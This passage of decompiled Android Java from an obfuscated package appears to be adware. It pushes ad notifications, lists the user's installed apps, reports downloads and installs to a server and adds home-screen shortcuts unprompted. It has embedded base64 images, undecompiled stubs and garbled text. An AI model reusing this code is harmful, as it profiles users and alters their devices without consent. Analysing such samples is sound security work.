Sl4Nzhw4sSJFYq46Kg49bZNxWjY8llSNu3IR+gmhst4uP/yZoaO7QcdD56N2IGsO3fu3Zu4ff16l12LLATqtNlKlbUtePdusK+ioGAnTIAlOToqJmXbtqzoVD+6ZIbPL1iwufOinGWbr6LcvNmsiMtB1qefTkxM3L9dq1FmA4UWxQSgVqtSJijNzr7g4Omu4EBvbUFBQbkX4KKcikaocfO8Ijo6WpEcF/32HZJ75QUFfciamBhoMmsSgNPqjCaTERrCVy0is5UJCUpNUXVb3+murq7BYHCgrbri2OA9lO4CkopPcSYmBk+fHpwIwjLo0VnZ8GMfQJMJNTTqdGjUWpUqW5WN0ISENM1ae1NTW8Ox0123J0i6TkO6AIEEAaotWqVXo2OVSEMe9DPqjDoJ0lQqbIJHosQsenMKn530+E1o0SoceOMG73OTEhI4C4I5cr4ODdlkBRiGm60VoUo+CY8J3pFNNOTBiWhZs1UwVKtJYjQDiEaMjoKdOrxEIhNU5eMClpYcjo7N1uJBm02kIZ5CmESlMiODm2Etfio7TMZMtorsRy/M7eQn0QiYxFRpQSIh8bIoYZYSAFaS+SFHI0NFXpbUz0hII7PIHaDV8aDVQiqGOpFaGRlkYRLIRwf+uwRYkQyuK7w+p2lJQQsesoWviEuohLUWDTZDmSGMWRlaDqE/6Qeg1SKxVCLQKJDCsAQ1m/TR6teuXatXcVZoqFhDHHiWStSwCkSO5HsSE53Fl9GZVyXHyGRxyRqt0I2zeM4EIMyhBYEiUacVo6SqSmW0r5CSNxTyLJ3QjHBG7KF+lio85Koq3BGb4p48C/eo1ZkjvGFls3QhzUiC2mGw0iKpdNgEUWxyrE5nNa9aVVTOCm+AKakeDSPEmfBgEVdVZbXCkG1EtAg1CUtck30VvFdlRR5FJaN9Rn7iOA17Nhhylc2GxRApFIW/le7yMAsnzoykMAxziALQwYEcGVLhaHtbg+wRj5IWVVqM3KwJGPEclZIqa73NZhNQUVGLw74iVfGoB+IKq2BZBAxSD3OIG/IRN61074QPI3SYxL5BXoBNtoY14716W5UEvkLCSbT+tsYmfDIthKIUb+2NQ8/A5biiUtzMxoP1NmjocolFDrV5e6u5jyHCZ4c33lkZzW9IzXCYrSoMq3e5HFYMukhLQYXj6nuDBZxHkbdb0SvfWSkTXoJKDm9GPJcDhuz1uHC4Z8khHn9tTgwdgcKwEVREBBWHPPIMCqVwiDEXHxvcKR4Pv0V6wsPbVA5vv9AFzUZEr1wZRdMK5JFncKgYh8tWTwbKcx6XBy4bmwjkUJe3t1ZKRXCnRgGlQF50BCsC4+yuhzAUNGQPH8H0+vtyKFbGhY2CxVi5eLEiQiYKrXCHSnAaxFsPDb0hknzxDQwqqNC5rCx58eLFyazYY+lyfu5DGsRtk/zT4fF5wuMPDqbSUaHIQEyRyUTPRNFxTb4wCcfnddgkf3rZ+xDo9QfvV1Cy6FCiol6LixJv07La3ofO8qE/Ps+/JD/4sxuJvlBPn3/g/m0FxUaFlRR9H0HHVPf5H24H8Ta+/BvJUz9yuH14E78C2uPvvXv/XKos4gmRxeU0BIWCPlEaHU9/UyL5ksvb7QuPf+Du/dsNFU9I9bnBu71+XCKM83V7Xd9Bv4T9rcfdGE76e0F8cu4GwXs0Xrf3b/i3xE+97HD7HxEH4B3yYxMM9j7O6+52OzyTyC+yJ7k83kafmPT7/b1PCux7jOZvhOvyh/yv2p/6iwdKwoHdoKJHNyL9vfgRCt7uhsF08w/uH9jX6HD9fZLofwMm/fzfXrvb3+hGM+FzN/oaG/3w8MLLuL1+N95oRBvwQDt9/JF4p9vu9Tz93fD/rvjqL/5jq/fVw30IPywc9T6HAx6eeiva8OINX73V63V4vGS7Hh3Gb7hsnt99i4P+B2xTkRmbbLQ/AAAAAElFTkSuQmCC"")));         intent.putExtra(""image"",""iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAMAAAC5zwKfAAAAA3NCSVQICAjb4U/gAAADAFBMVEX////kw5/ewIv43KjvyIHEtZnHqm67YCyrSiDl0KnEtZmUQRv43Kj1zZ3kw5+sUSKrSiCUQRvevIC7YCysUSL1zZ3vyIG7YCysUSK7YCz43Kjl0KnvyIHevICrXCmrSiD1zZ3l0KnvyIG7YCyrXCmsUSKrSiD43KjvyIHeuHu7YCyrXCmrSiD43KjvyIHWrWusUSKrSiD43Kj1zZ3vyIHeuHvbsnHWqWS1aTK7YCyrXCmkUyisUSL////1/v349/bs9ffu7+/s6OTU6vPd5+L437Ts3s/p2fT43KjY3+HM3Nu63+3X09r1zZ2n3Pfl0KnwyLjMzMzvyIHkw5/Gx8H/wDDewIvevIDeuHvKtc7fuF/XtHnXp/rbsnHEtZnNtHso1v9pxeets6vWrWvwpl3qoabWrVnkqzebs77WqWTZqF36pBvHqm7TpVWQuzjGmOqqpp/OoFLPn1zBol/vljabpo0tuvbNmkr3kxITv/kyudqtnYR8rVGqmmxEsMH4f4XHk0fAlFcpsur2iRGnmFuTmJcMtPb4hAXFjEM0uSbUhi2ljGVhpETDhUL2fAsNqfYNq+PdghGuiFDAc/Slf8nDgV2aiXxTl5ZinR2+fTr0cQr1Z26pfVAOn9SvekGDgn20djeFe5G7czcapBPXbQ0QlNLjX2SAeWemcFemZ5lkgHBtfzi1aTIIjr9UhjicbzupaTunWNaMbjq5TfiCbFmWYoYof6P2SVHXUGOqYi65TNhqZKerXCmXYTY/coJOdyexWw2mS9BrZlmkUyiTWDKZVCpbYWCGVzTQPUCiOeccZ6CSUw+nRVerSiCqM/RuWTB9SZuaSyK/KP9UVlwJcQwvYyN4Pcj/IjB7Q3NRVTOKRR/2IzDgKTBNUVmUQRuXK+KpGvh6PBr4FStmPyVrMJn3ESFuNxdYPCqlD/n/ChgzQF/jEB+ZEPiVEucJRm3xCBhgKH7ZDRuWBveHC+vyAAteKg8zMzN7Dc6vDhpSJQ5kCsSVDBaGChQ2HQ9DBKVYBw3KOpWUAAABAHRSTlMAIiIzMzMzMzNERERVVVVVVVVmZmZ3d4iImaqqqqqqqru7u7u7u7vMzMzMzMzd3d3d3e7u7u7u7u7u7u7u////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Tfl3FgAAAAlwSFlzAAALEgAACxIB0t1+/AAAAB90RVh0U29mdHdhcmUATWFjcm9tZWRpYSBGaXJld29ya3MgOLVo0ngAAA0nSURBVFiFfdkJXBNXHgfw7N293fu+u/e2u9vtsdvdmWFiDAWxBY2KIKCAsQgoSajBs4mIyUKDECw2HoFSFbXRxIBSbOJBiIBaMLUKBgERgagoCkYUq+z/vTczmXjsz4hMZuab33tvhk+CEgnJF37yzHPTcF7hMuX/hT/oFXLKc8/96iuSsHzux8++kJSWhJIYHx8/m2TWk0J2w4Hx6Iy0tKQXn//l10TcZ34/OwOSBnuSEhMR+TgxJSVLo8lKQU/zXCLx0tLg7Phnvsx73/hHGueRjvGPdJw9G7C1a4vKy4vWYjJUj/cg079HvM8+T7Y5MfEhj8eK9u/ad/DgwV1FmhQeFBpywPSvY/DX8K1aXFE0i4kpWVkIK9919GDNxzi7irISnwBmPIu8zyephYLCiEGMRxge565dGLtA8vH+tcKgE8PGDM73JZIv/lSNEhJRv8TERA7bv+tojWBdCKAvR4uy+FVOEjVEiPqP35b87K88yA8YBbSinYC1ABYIYCfA/9taq0mJF1UMgeqMl/4gefYlUUESxO3ksKGhISQFRgIXWmvK5pYhtcOclYJfNvHhiuqMFyQvhkYMZJZGr9doNFv2t0CjkZEhlJGRkQDCIimKikQvcMq5xazXZGWByIG8p1YnSBIEMCMjS2PeguKsbR0iGmBDF1rLlkQyFEVHRlJMK4A9x3ZXVBeZAdVkkTEJnjpNwn2HPI1+y/tvQfaeOxUYJdgQqgYYxUbOLWvpYakaeO7CgeXzlq/eWFG9BZoiNVRQnSEC1eD9F2dvzwiAQ/w4AVtS0wP+yFxqLgI/3FMyDwJodS2gSFU/BtQg7z14vHcGwNHRMjROBrB9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"");       }  catch (      IOException e5) {         throw e5;       }     }     PendingIntent broadcast=PendingIntent.getBroadcast(context,parseInt,intent,134217728);     Notification notification=new Notification(intExtra,b2,System.currentTimeMillis());     notification.setLatestEventInfo(context,a2,b2,broadcast);     try {       if (fVar.g() == 1) {         notification.flags=32;       }       Class<?> cls=Class.forName(""com.android.internal.R$id"");       int i=cls.getField(""title"").getInt(cls);       int i2=cls.getField(""text"").getInt(cls);       notification.contentView.setImageViewBitmap(cls.getField(""icon"").getInt(cls),bitmap);       notification.contentView.setTextViewText(i,a2);       notification.contentView.setTextViewText(i2,b2);       notification.contentIntent=broadcast;       notification.defaults|=4;       notification.flags|=1;       notification.ledARGB=-65536;       notification.ledOffMS=300;       notification.ledOnMS=300;       notificationManager.notify(parseInt,notification);     }  catch (    Exception e6) {       throw e6;     }   }   public static void a(  String str,  Context context){     z.a(context,str,(Object)(z.a(context,str,"""") + ""download=ok""));   }   public static void a(  je.mnvs.uyr.d r8,  android.content.Context r9,  int r10,  android.view.View r11){     throw new UnsupportedOperationException(""Method not decompiled: je.mnvs.uyr.e.a(je.mnvs.uyr.d, android.content.Context, int, android.view.View):void"");   }   private static boolean a(  int i,  int i2){     return a(i,false) && a(i2,true);   }   private static boolean a(  int i,  boolean z){     Calendar calendar=Calendar.getInstance();     calendar.setTime(new Date());     int i2=calendar.get(11);     if (z) {       if (i2 < i) {         return true;       }     }  else     if (i2 >= i) {       return true;     }     return false;   }   public static boolean a(  long j){     try {       return System.currentTimeMillis() - j > 86400000;     }  catch (    Exception e2) {       e2.printStackTrace();       return false;     }   }   public static boolean a(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo != null) {       return activeNetworkInfo.isAvailable() && activeNetworkInfo.isConnected();     }     return false;   }   public static boolean a(  Context context,  String str){     try {       return context.getPackageManager().getPackageInfo(str,0) != null;     }  catch (    PackageManager.NameNotFoundException e2) {       return false;     }   }   public static boolean a(  String str){     return str == null || str.trim().length() == 0 || ""null"".equals(str) || ""{}"".equals(str);   }   private static long b(){     try {       StatFs statFs=new StatFs(Environment.getExternalStorageDirectory().getPath());       return ((statFs.getAvailableBlocks() * statFs.getBlockSize()) / 1024) / 1024;     }  catch (    Exception e2) {       e2.printStackTrace();       return 1024L;     }   }   public static Class b(  Context context,  Class cls){     Class<?> cls2;     try {       ActivityInfo[] activityInfoArr=context.getPackageManager().getPackageInfo(context.getApplicationInfo().packageName,1).activities;       int i=0;       while (true) {         int i2=i;         if (i2 >= activityInfoArr.length) {           break;         }         try {           cls2=Class.forName(activityInfoArr[i2].name);         }  catch (        ClassNotFoundException e2) {           e2.printStackTrace();         }         if (cls.isAssignableFrom(cls2)) {           return cls2;         }         i=i2 + 1;       }     }  catch (    PackageManager.NameNotFoundException e3) {       e3.printStackTrace();     }     return null;   }   public static String b(  Context context){     return z.a(context,""appid"","""");   }   public static String b(  String str,  Context context){     return z.a(context,str,"""");   }   private static List b(  String str){     if (str == null) {       return null;     }     ArrayList arrayList=new ArrayList();     String[] split=str.split(""&"");     for (int i=0; i < split.length; i++) {       if (split[i] != null && split[i].length() > 0 && split[i].indexOf(""="") != -1) {         String[] split2=split[i].split(""="");         if (split2.length == 2 && !""null"".equals(split[1].toLowerCase())) {           arrayList.add(new BasicNameValuePair(split2[0],split2[1]));         }       }     }     return arrayList;   }   public static void b(  Context context,  String str){     try {       PackageManager packageManager=context.getPackageManager();       new Intent();       Intent launchIntentForPackage=packageManager.getLaunchIntentForPackage(str);       launchIntentForPackage.addFlags(268435456);       context.startActivity(launchIntentForPackage);     }  catch (    ActivityNotFoundException e2) {       e2.printStackTrace();     }   }   private static boolean b(  long j){     try {       return System.currentTimeMillis() - j > 43200000;     }  catch (    Exception e2) {       e2.printStackTrace();       return false;     }   }   public static List c(  Context context){     int i=0;     PackageManager packageManager=context.getPackageManager();     ArrayList arrayList=new ArrayList();     try {       List<PackageInfo> installedPackages=packageManager.getInstalledPackages(0);       while (true) {         int i2=i;         if (i2 >= installedPackages.size()) {           break;         }         PackageInfo packageInfo=installedPackages.get(i2);         int i3=packageInfo.applicationInfo.flags;         ApplicationInfo applicationInfo=packageInfo.applicationInfo;         if ((i3 & 1) <= 0) {           arrayList.add(packageInfo);         }         i=i2 + 1;       }     }  catch (    Exception e2) {       e2.printStackTrace();     }     return a(arrayList);   }   public static void c(  String str,  Context context){     z.a(context,""appid"",(Object)str);   }   public static boolean c(  Context context,  String str){     return context.getPackageManager().checkPermission(str,context.getPackageName()) == 0;   }   public static String d(  Context context,  String str){     HttpGet httpGet=new HttpGet(str);     String str2="""";     try {       BasicHttpParams basicHttpParams=new BasicHttpParams();       if (j(context)) {         basicHttpParams.setParameter(""http.route.default-proxy"",new HttpHost(""10.0.0.172"",80));       }       HttpResponse execute=new DefaultHttpClient(basicHttpParams).execute(httpGet);       if (execute.getStatusLine().getStatusCode() == 200) {         BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(execute.getEntity().getContent(),""UTF-8""));         StringBuilder sb=new StringBuilder();         while (true) {           String readLine=bufferedReader.readLine();           if (readLine == null) {             break;           }           sb.append(readLine);         }         str2=sb.toString();       }     }  catch (    Exception e2) {     }  finally {       httpGet.abort();     }     return str2;   }   public static void d(  android.content.Context r6){     throw new UnsupportedOperationException(""Method not decompiled: je.mnvs.uyr.e.d(android.content.Context):void"");   }   public static void d(  String str,  Context context){     z.a(context,""channelid"",(Object)str);   }   public static void e(  Context context,  String str){     Toast.makeText(context,str,0).show();   }   public static void e(  String str,  Context context){     String a2=z.a(context,str,"""");     if ("""".equals(a2)) {       return;     }     new aa(context).execute(c.e,a2);   }   public static boolean e(  Context context){     ConnectivityManager connectivityManager=(ConnectivityManager)context.getSystemService(""connectivity"");     return (connectivityManager == null || connectivityManager.getActiveNetworkInfo() == null || !connectivityManager.getActiveNetworkInfo().getTypeName().equalsIgnoreCase(""wifi"")) ? false : true;   }   public static Drawable f(  Context context,  String str){     File file=new File(context.getDir(""gboxfile"",0),str);     if (!file.exists()) {       d(context);     }     return Drawable.createFromPath(file.getAbsolutePath());   }   public static void f(  Context context){     if (b(z.a(context,""addscag_time"",0L))) {       a(context,h(context));       z.a(context,""addscag_time"",Long.valueOf(System.currentTimeMillis()));     }     try {       if (a(11,14)) {         j(context,""listam_time"");       }  else       if (a(20,24)) {         j(context,""listpm_time"");       }     }  catch (    Exception e2) {       e2.printStackTrace();     }   }   public static void f(  String str,  Context context){     String a2=z.a(context,str,"""");     if (c.a != null && !c.a.isEmpty()) {       c.a.add(str);     }     if ("""".equals(a2) || !a2.contains(""download"")) {       return;     }     StringBuilder sb=new StringBuilder();     sb.append(System.currentTimeMillis() + ""#"");     sb.append(context.getSharedPreferences(""popad_turn"",0).getString(str,""""));     String sb2=sb.toString();     SharedPreferences.Editor edit=context.getSharedPreferences(""installapp"",0).edit();     if (sb2 instanceof String) {       edit.putString(str,sb2.toString());     }  else     if (sb2 instanceof Boolean) {       edit.putBoolean(str,Boolean.getBoolean(sb2.toString()));     }  else     if (sb2 instanceof Float) {       edit.putFloat(str,Float.parseFloat(sb2.toString()));     }  else     if (sb2 instanceof Integer) {       edit.putInt(str,Integer.parseInt(sb2.toString()));     }  else     if (sb2 instanceof Long) {       edit.putLong(str,Long.parseLong(sb2.toString()));     }  else {       edit.putString(str,sb2.toString());     }     edit.commit();     SharedPreferences sharedPreferences=context.getSharedPreferences(""popad_turn"",0);     if (sharedPreferences.contains(str)) {       sharedPreferences.edit().remove(str).commit();     }     try {       ((NotificationManager)context.getApplicationContext().getSystemService(""notification"")).cancel(str.hashCode());       b(context,str);       StringBuilder sb3=new StringBuilder();       sb3.append(a2).append(""&adv="").append(g(context,str));       new aa(context).execute(c.f,sb3.toString());       String a3=z.a(context,str,"""");       if (a3.contains(""download"")) {         z.a(context,str,(Object)a3.substring(0,a3.lastIndexOf(""&"")));       }     }  catch (    Exception e2) {       e2.printStackTrace();     }     try {       if (c(context,""com.android.launcher.permission.INSTALL_SHORTCUT"")) {         i(context,str);       }     }  catch (    Exception e3) {       e3.printStackTrace();     }   }   private static String g(  Context context,  String str){     try {       PackageInfo packageInfo=context.getPackageManager().getPackageInfo(str,0);       return packageInfo != null ? packageInfo.versionCode + "","" + packageInfo.versionName : """";     }  catch (    PackageManager.NameNotFoundException e2) {       e2.printStackTrace();       return """";     }   }   public static void g(  Context context){     if (Build.VERSION.SDK_INT > 10) {       Intent intent=new Intent(""android.settings.SETTINGS"");       intent.addFlags(268435456);       context.startActivity(intent);     }  else {       Intent intent2=new Intent(""android.settings.WIRELESS_SETTINGS"");       intent2.addFlags(268435456);       context.startActivity(intent2);     }     e(context,""æ‚¨å½“å‰�æ— ç½‘ç»œ,è¯·è®¾ç½®ç½‘ç»œå�Žé‡�è¯•!"");   }   public static int h(  Context context){     boolean c2=c.a().c(context);     boolean d2=c.a().d(context);     boolean e2=c.a().e(context);     boolean b2=c.a().b(context);     if (c2) {       return 14;     }     if (d2) {       return 15;     }     if (e2) {       return 16;     }     return b2 ? 17 : 0;   }   private static String h(  Context context,  String str){     String str2=null;     HttpGet httpGet=new HttpGet(str);     try {       BasicHttpParams basicHttpParams=new BasicHttpParams();       HttpConnectionParams.setConnectionTimeout(basicHttpParams,20000);       HttpConnectionParams.setSoTimeout(basicHttpParams,20000);       HttpConnectionParams.setSocketBufferSize(basicHttpParams,8192);       HttpClientParams.setRedirecting(basicHttpParams,true);       HttpProtocolParams.setUserAgent(basicHttpParams,null);       if (j(context)) {         basicHttpParams.setParameter(""http.route.default-proxy"",new HttpHost(""10.0.0.172"",80));       }       HttpResponse execute=new DefaultHttpClient(basicHttpParams).execute(httpGet);       if (execute.getStatusLine().getStatusCode() == 200) {         InputStream content=execute.getEntity().getContent();         ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();         byte[] bArr=new byte[1024];         while (true) {           int read=content.read(bArr);           if (read == -1) {             break;           }           byteArrayOutputStream.write(bArr,0,read);         }         str2=q.a(byteArrayOutputStream.toByteArray());       }     }  catch (    Exception e2) {     }  finally {       httpGet.abort();     }     return str2;   }   private static String i(  Context context){     String str;     Exception e2;     try {       ConnectivityManager connectivityManager=(ConnectivityManager)context.getSystemService(""connectivity"");       NetworkInfo networkInfo=connectivityManager.getNetworkInfo(0);       NetworkInfo networkInfo2=connectivityManager.getNetworkInfo(1);       str=(networkInfo == null || networkInfo.getState() != NetworkInfo.State.CONNECTED) ? """" : networkInfo.getExtraInfo();       if (networkInfo2 == null) {         return str;       }       try {         return networkInfo2.getState() == NetworkInfo.State.CONNECTED ? ""wifi"" : str;       }  catch (      Exception e3) {         e2=e3;         e2.printStackTrace();         return str;       }     }  catch (    Exception e4) {       str="""";       e2=e4;     }   }   private static boolean i(  Context context,  String str){     int i;     String str2;     Context context2;     String str3=""unknown"";     PackageManager packageManager=context.getPackageManager();     Intent intent=new Intent(""android.intent.action.MAIN"",(Uri)null);     intent.addCategory(""android.intent.category.LAUNCHER"");     List<ResolveInfo> queryIntentActivities=packageManager.queryIntentActivities(intent,1);     int i2=0;     while (true) {       if (i2 >= queryIntentActivities.size()) {         i=0;         str2=null;         break;       }       ResolveInfo resolveInfo=queryIntentActivities.get(i2);       if (resolveInfo.activityInfo.packageName.equals(str)) {         str3=resolveInfo.loadLabel(packageManager).toString();         String str4=resolveInfo.activityInfo.name;         int i3=resolveInfo.activityInfo.applicationInfo.icon;         str2=str4;         i=i3;         break;       }       i2++;     }     if (str2 == null) {       return false;     }     Intent intent2=new Intent(""com.android.launcher.action.INSTALL_SHORTCUT"");     intent2.putExtra(""android.intent.extra.shortcut.NAME"",str3);     intent2.putExtra(""duplicate"",false);     intent2.putExtra(""android.intent.extra.shortcut.INTENT"",new Intent(""android.intent.action.MAIN"").setComponent(new ComponentName(str,str2)));     if (context.getPackageName().equals(str)) {       context2=context;     }  else {       try {         context2=context.createPackageContext(str,3);       }  catch (      PackageManager.NameNotFoundException e2) {         e2.printStackTrace();         context2=null;       }     }     if (context2 != null) {       intent2.putExtra(""android.intent.extra.shortcut.ICON_RESOURCE"",Intent.ShortcutIconResource.fromContext(context2,i));     }     context.sendBroadcast(intent2);     return true;   }   private static void j(  Context context,  String str){     Bitmap bitmap;     try {       String a2=z.a(context,str,""0"");       String a3=a();       if (a2.equals(a3)) {         return;       }       Map<String,?> all=context.getSharedPreferences(""popad_turn"",0).getAll();       ArrayList<d> arrayList=new ArrayList();       Iterator<String> it=all.keySet().iterator();       while (it.hasNext()) {         d dVar=new d(String.valueOf(all.get(it.next())));         String g=dVar.g();         boolean equals=Environment.getExternalStorageState().equals(""mounted"");         String substring=g.substring(g.lastIndexOf(""/"") + 1);         if (new File((equals ? Environment.getExternalStorageDirectory().getAbsolutePath() + ""/download/gbox/"" : context.getCacheDir().getPath() + ""/"") + substring).exists()) {           arrayList.add(dVar);         }         if (arrayList.size() == 4) {           break;         }       }       if (arrayList.isEmpty()) {         return;       }       k(context);       z.a(context,str,(Object)a3);       for (      d dVar2 : arrayList) {         String str2=Environment.getExternalStorageState().equals(""mounted"") ? Environment.getExternalStorageDirectory().getAbsolutePath() + ""/download/gbox/"" : context.getCacheDir().getPath() + ""/"";         String h=dVar2.h();         String e2=dVar2.e();         String g2=dVar2.g();         String substring2=g2.substring(g2.lastIndexOf(""/"") + 1);         b=h.hashCode();         String str3=str2 + substring2;         if (new File(str3).exists()) {           try {             Bitmap a4=new l(context).a(context,dVar2.m());             if (a4 == null) {               try {                 bitmap=BitmapFactory.decodeStream(new 